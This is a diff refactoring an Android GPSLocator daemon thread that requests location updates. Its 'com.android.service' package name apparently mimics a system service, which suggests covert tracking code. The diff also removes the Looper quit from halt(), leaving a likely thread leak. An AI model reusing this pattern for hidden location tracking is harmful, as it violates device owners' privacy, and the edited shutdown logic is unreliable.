@@ -21,13 +21,11 @@ import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
 public abstract class GPSLocator extends Thread {
-
 	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
-	private LocationManager lm;
-	private LocationListener listener;
+	protected LocationManager lm;
+	protected LocationListener listener;
 
-	Looper myLooper;
-	protected String provider=LocationManager.GPS_PROVIDER;
+	protected String provider = LocationManager.GPS_PROVIDER;
 
 	public GPSLocator() {
 		setDaemon(true);
@@ -35,6 +33,16 @@ public abstract class GPSLocator extends Thread {
 		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
 	}
 
+	public abstract void initLocationUpdates();
+	
+	@Override
+	public void run() {
+		Looper.prepare();
+		initLocationUpdates();
+		
+		Looper.loop();
+	}
+	
 	public GPSLocator(LocationListener listener) {
 		setListener(listener);
 	}
@@ -43,28 +51,13 @@ public abstract class GPSLocator extends Thread {
 		this.listener = listener;
 	}
 
-	public abstract void go(LocationListener listener, LocationManager lm);
-
 	public Location getLastKnownPosition(){		
 		return lm.getLastKnownLocation(provider);
-	}
-	
-	@Override
-	public void run() {
-		Looper.prepare();
-		go(listener, lm);
-		myLooper = Looper.myLooper();
-		Looper.loop();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " exiting") ;//$NON-NLS-1$
-		}
 	}
 
 	public void halt() {
 		lm.removeUpdates(listener);
-		if (myLooper != null) {
-			myLooper.quit();
-		}
+
 		lm = null;
 	}
 }
